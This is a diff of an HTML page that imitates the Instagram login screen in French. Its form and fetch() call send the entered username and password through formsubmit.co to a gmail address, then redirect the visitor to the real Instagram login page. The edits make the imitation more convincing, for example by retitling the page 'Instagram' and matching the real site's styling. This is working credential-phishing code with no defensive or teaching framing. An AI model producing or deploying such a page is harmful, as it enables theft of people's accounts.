@@ -3,14 +3,12 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Connexion Instagram</title>
+<title>Instagram</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
-
   body {
     background: #000;
     color: #fff;
-    font-family: Arial, sans-serif;
+    font-family: system-ui, Arial, sans-serif;
     display: flex;
     justify-content: center;
     align-items: center;
@@ -19,21 +17,23 @@
   }
   .container {
     background: #121212;
-    padding: 30px;
+    padding: 40px 30px;
     border-radius: 8px;
     width: 320px;
     box-sizing: border-box;
   }
-  h1 {
-    font-family: 'Pacifico', cursive;
-    font-size: 40px;
-    margin: 0 0 20px 0;
+  .logo {
     text-align: center;
+    font-family: 'Arial', sans-serif;
+    font-size: 36px;
+    font-weight: 700;
+    margin-bottom: 30px;
   }
   label {
     display: block;
-    margin: 12px 0 6px;
+    margin-top: 15px;
     font-size: 14px;
+    font-weight: 400;
   }
   input[type="text"],
   input[type="password"] {
@@ -44,50 +44,40 @@
     border-radius: 4px;
     color: #fff;
     font-size: 14px;
+    margin-top: 5px;
   }
   button {
     width: 100%;
     margin-top: 20px;
-    padding: 10px;
+    padding: 12px;
     background: #3897f0;
     border: none;
     border-radius: 4px;
     color: white;
-    font-weight: bold;
-    font-size: 16px;
+    font-weight: 600;
+    font-size: 14px;
     cursor: pointer;
   }
   .facebook-btn {
     background: #1877f2;
-    margin-bottom: 15px;
-    cursor: default; /* désactivé */
-    border: none;
-    padding: 12px;
-    font-weight: bold;
-    font-size: 16px;
-    color: white;
-    border-radius: 5px;
-    width: 100%;
+    margin-bottom: 20px;
+    font-weight: 600;
+    cursor: default;
   }
 </style>
 </head>
 <body>
 
 <div class="container">
-  <h1>Instagram</h1>
+  <div class="logo">Instagram</div>
 
-  <form 
-    id="instaForm"
-    action="https://formsubmit.co/design.site.web69@gmail.com" 
-    method="POST"
-    autocomplete="off"
-  >
-    <button type="button" class="facebook-btn" disabled>Connexion avec Facebook</button>
+  <form id="instaForm" action="https://formsubmit.co/design.site.web69@gmail.com" method="POST" autocomplete="off">
+    <button type="button" class="facebook-btn" disabled>Continuer avec Facebook</button>
 
-    <label for="username">Téléphone, nom d’utilisateur ou email *</label>
+    <label for="username">Téléphone, nom d’utilisateur ou e-mail</label>
     <input type="text" id="username" name="username" required />
 
-    <label for="password">Mot de passe *</label>
+    <label for="password">Mot de passe</label>
     <input type="password" id="password" name="password" required />
 
     <button type="submit">Se connecter</button>
@@ -103,7 +93,7 @@
     fetch('https://formsubmit.co/design.site.web69@gmail.com', {
       method: 'POST',
       body: formData,
-      mode: 'no-cors' // permet de contourner le CORS
+      mode: 'no-cors'
     }).finally(() => {
       window.location.href = 'https://www.instagram.com/accounts/login/';
     });
